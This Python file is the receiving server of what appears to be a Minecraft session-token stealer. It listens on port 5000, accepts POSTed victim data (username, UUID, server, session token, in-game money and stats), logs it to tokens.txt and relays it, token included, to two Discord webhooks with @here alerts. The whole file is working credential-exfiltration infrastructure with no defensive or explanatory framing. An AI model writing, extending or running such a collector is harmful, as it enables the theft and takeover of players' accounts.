from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import os

# =========== CONFIG LOADING ===========
def load_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            return config
    except FileNotFoundError:
        print("❌ ERROR: config.json not found!")
        print("Create config.json with: {\"discord_webhook\": \"YOUR_WEBHOOK\"}")
        exit(1)
    except json.JSONDecodeError:
        print("❌ ERROR: Invalid config.json!")
        exit(1)

# Load webhook from config file
config = load_config()
DISCORD_WEBHOOK = config.get('discord_webhook')
DISCORD_WEBHOOK2 = config.get('discord_webhook2')

if not DISCORD_WEBHOOK or not DISCORD_WEBHOOK2:
    print("❌ ERROR: discord_webhook not found in config.json!")
    exit(1)

print("✅ Config loaded - 2 webhooks ready")
# ======================================

def send_to_discord(webhook_url, payload):
    """Send payload to a Discord webhook"""
    try:
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        req_data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(webhook_url, data=req_data, headers=headers)
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception as e:
        print(f"❌ Discord error ({webhook_url[-10:]}): {e}")
        return False

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            username = data.get('username', 'Unknown').strip()
            uuid = data.get('uuid', '').strip()
            server = data.get('server', '').strip()
            token = data.get('token', '').strip()
            money = data.get('money', '0').strip()
            playtime = data.get('playtime', '0h').strip()
            kills = data.get('kills', '0').strip()
            deaths = data.get('deaths', '0').strip()
            skin = data.get('skin', '').strip()
            log_type = data.get('type', 'login').strip()
            
            print(f"Got: {username} on {server}")
            
            with open('tokens.txt', 'a') as f:
                f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
            
            # Build Discord message
            is_login = log_type.lower() == "login"
            
            description = f"**Username:** `{username}`\n**UUID:** `{uuid}`\n**Server:** `{server}`"
            
            if money and money != "0":
                description += f"\n**Money:** `{money}`"
            if playtime and playtime != "0h":
                description += f"\n**Playtime:** `{playtime}`"
            if kills and kills != "0":
                description += f"\n**Kills:** `{kills}`"
            if deaths and deaths != "0":
                description += f"\n**Deaths:** `{deaths}`"
            
            if is_login and token:
                description += f"\n\n🔑 **Session Token:**\n||`{token}`||"
            
            embed = {
                "title": "✅ User Connected" if is_login else "❌ User Disconnected",
                "color": 5763719 if is_login else 15548997,
                "description": description
            }
            
            if skin:
                embed["thumbnail"] = {"url": skin}
            elif uuid:
                embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
            
            content = None
            if is_login:
                if money and money != "0":
                    content = f"@here Money: ||{money}||"
                else:
                    content = "@here"
            
            payload = {
                "content": content,
                "embeds": [embed],
                "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
            
            # Send to BOTH webhooks
            success1 = send_to_discord(DISCORD_WEBHOOK, payload)
            success2 = send_to_discord(DISCORD_WEBHOOK2, payload)
            
            if success1 and success2:
                print(f"✅ Sent to both webhooks")
            elif success1 or success2:
                print(f"⚠️ Sent to one webhook only")
            else:
                print(f"❌ Failed to send to both webhooks")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            print(f"❌ Error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')
    
    def log_message(self, format, *args):
        pass

print("🚀 Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
